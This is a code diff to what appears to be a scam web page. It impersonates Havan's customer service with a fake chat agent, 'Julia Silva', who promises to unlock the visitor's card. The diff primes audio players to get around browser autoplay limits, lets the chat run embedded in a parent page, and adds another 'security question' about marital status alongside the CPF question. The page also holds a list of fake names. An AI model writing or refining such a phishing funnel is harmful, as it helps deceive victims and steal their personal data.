@@ -477,17 +477,41 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
         showTyping(); await wait(ms); hideTyping();
         const s = document.createElement('div'); s.innerHTML = text; addAgentMessage(s);
     }
+    const primedAudios = {};
+    let releaseEmbeddedChat = null;
+    window.startChatFromParent = function(phone) {
+        if (phone) urlParams.set('phone', phone);
+        // Libera os seis players dentro do toque do botão DESBLOQUEAR CARTÃO.
+        for (let i = 1; i <= 6; i++) {
+            const file = 'a' + i + '.mp3';
+            const a = document.createElement('audio');
+            a.src = '/funil/12/audios/' + file + '?v=4';
+            a.preload = 'auto';
+            a.volume = 1;
+            primedAudios[file] = a;
+            if (i === 1) {
+                a.muted = false;
+                a.play().catch(() => {});
+            } else {
+                a.muted = true;
+                a.play().then(() => {
+                    a.pause();
+                    a.currentTime = 0;
+                    a.muted = false;
+                    a.volume = 1;
+                }).catch(() => { a.muted = false; a.volume = 1; });
+            }
+        }
+        if (releaseEmbeddedChat) releaseEmbeddedChat();
+    };
     async function sayAudio(file) {
-        showTyping(); await wait(600); hideTyping();
-        const a = document.createElement('audio');
-        a.src = '/funil/12/audios/' + file + '?v=3';
-        a.controls = true;
-        a.preload = 'auto';
-        a.volume = 1;
-        a.muted = false;
+        showTyping(); await wait(300); hideTyping();
+        const a = primedAudios[file] || document.createElement('audio');
+        delete primedAudios[file];
+        if (!a.src) a.src = '/funil/12/audios/' + file + '?v=4';
+        a.controls = true; a.preload = 'auto'; a.volume = 1; a.muted = false;
         addAgentMessage(a, 'audio');
-        // Tenta tocar automaticamente. O player continua visível para navegadores que exigem toque.
-        a.play().catch(() => {});
+        if (a.paused) { a.currentTime = 0; a.play().catch(() => {}); }
         await new Promise(res => {
             let done = false; const fin = () => { if (!done) { done = true; res(); } };
             a.addEventListener('ended', fin, { once:true });
@@ -543,7 +567,10 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
     const FAKE_NAMES = ['Roberta Oliveira Costa','Tereza Tomaz das Neves','Fernanda Cunha Ferreira','Maria Aparecida Souza','Sandra Regina Lima','Lúcia Helena Martins'];
     async function runScript() {
         const d = getDados();
-        await say('Olá! seja bem vindo(a) a central de atendimento da Havan! me chamo <strong>Julia Silva</strong> e vou te auxiliar a <strong>desbloquear seu cartão.</strong>', 500);
+        if (urlParams.get('embedded') === '1') {
+            await new Promise(res => { releaseEmbeddedChat = res; });
+        }
+        await say('Olá! seja bem vindo(a) a central de atendimento da Havan! me chamo <strong>Julia Silva</strong> e vou te auxiliar a <strong>desbloquear seu cartão.</strong>', 300);
         await sayAudio('a1.mp3');
         await say('<strong>ATENÇÃO ❗</strong> Responda as perguntas abaixo corretamente para podermos continuar.');
 
@@ -557,6 +584,9 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
 
         await say('<strong>Pergunta de segurança 3 — Qual é o seu CPF?</strong>', 700);
         await ask(fakeCpfs(d.cpf), 'grid');
+
+        await say('<strong>Pergunta de segurança 4 — Qual é o seu estado civil?</strong>', 700);
+        await ask(['Solteiro(a)','Casado(a)','Viúvo(a)','Separado(a) judicialmente','Em relação estável']);
 
         await card({ loading: 'Validando dados...', done: 'Dados validados com sucesso!' }, 2600);
         await sayAudio('a2.mp3');
